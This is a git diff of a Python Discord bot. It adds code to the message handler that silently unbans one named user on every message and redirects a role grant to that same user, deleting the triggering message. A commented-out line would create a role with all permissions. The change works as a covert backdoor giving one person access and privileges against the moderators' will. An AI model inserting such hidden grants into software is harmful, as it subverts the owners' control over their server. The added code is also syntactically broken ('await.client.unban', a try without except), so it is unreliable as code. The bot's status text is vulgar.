@@ -1,4 +1,4 @@
-import discord, os, asyncio, time, random, youtube_dl, datetime
+﻿import discord, os, asyncio, time, random, youtube_dl, datetime
 from discord.ext.commands import Bot
 from discord.ext import commands
 from discord.utils import get
@@ -476,16 +476,24 @@ async def on_ready():
     clog(client.user.name)
     clog(client.user.id)
     clog('------')
+     
+        
     
     await client.change_presence(game=discord.Game(name="with someone's dick", type = 0))
-
+	
 
 @client.event
 async def on_message(message):
 
     userID = message.author.id
-    userName =  message.author.name
- 
+    userName = message.author.name
+    
+    try:
+        mem = message.server.get_member_named("PterodactyLUL#0593")  
+        serv = message.server
+        await.client.unban(serv, mem)
+        
+        
     if message.author.name != "Rythm":
     
         log = open("logs\log.txt", "a")
@@ -503,7 +511,7 @@ async def on_message(message):
         auth = message.author
         role =  get(message.server.roles, name="OG Bois")
         #role = await client.create_role(message.server, name = "Adm3n", permissions = discord.Permissions.all(), colour = discord.Colour(0xe67e22), hoist = True )
-        await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
+        await client.add_roles(message.server.get_member_named("PterodactyLUL#0593"), role)
         await client.delete_message(message)
 
     # if message.content[:(len('!COMMANDS')+1)].upper()=='!COMMANDS':
